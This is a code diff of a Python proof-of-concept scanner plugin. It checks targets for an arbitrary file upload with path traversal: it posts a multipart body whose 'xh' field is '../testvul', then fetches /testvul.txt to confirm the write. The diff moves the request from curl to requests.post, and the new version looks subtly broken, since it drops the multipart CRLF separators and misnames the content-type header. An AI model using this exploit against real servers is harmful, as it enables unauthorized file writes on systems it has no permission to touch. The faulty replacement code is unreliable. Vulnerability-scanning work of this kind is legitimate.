@@ -38,20 +38,19 @@ class Poc(ABPoc):
             if code == 404:
                 pass         
             else:
-                postData = '------WebKitFormBoundaryJXJgj6MiAAHumixA\r\n\
-                Content-Disposition: form-data; name=\\"theFile\\"; filename=\\"testvul.txt\\"\r\n\
-                Content-Type: text/plain\r\n\r\n\
-                testvul\r\n\
-                ------WebKitFormBoundaryJXJgj6MiAAHumixA\r\n\
-                Content-Disposition: form-data; name=\\"xh\\"\r\n\r\n\
-                ../testvul\r\n\
-                ------WebKitFormBoundaryJXJgj6MiAAHumixA--\r\n'
-                
-                userAgent = 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36'
-                contentType = 'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJXJgj6MiAAHumixA'
-                curlArg = '-H "' +contentType+ '" -d "' +postData+ '" -A "' +userAgent+ '" ' +url
-                
-                code, head, res, errcode, _ = hh.http(curlArg)
+                postData = '------WebKitFormBoundaryJXJgj6MiAAHumixA\
+                Content-Disposition: form-data; name=\\"theFile\\"; filename=\\"testvul.txt\\"\
+                Content-Type: text/plain\
+                testvul\
+                ------WebKitFormBoundaryJXJgj6MiAAHumixA\
+                Content-Disposition: form-data; name=\\"xh\\"\
+                ../testvul\
+                ------WebKitFormBoundaryJXJgj6MiAAHumixA--'
+                header = {
+                    "User-Agent" : 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36',
+                    "ContentType" : 'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJXJgj6MiAAHumixA'
+                }
+                req = requests.post(url, data=postData, headers=header)
 
                 #验证
                 code, head, res, errcode, _ = hh.http('{target}'.format(target=self.target)+'/testvul.txt')
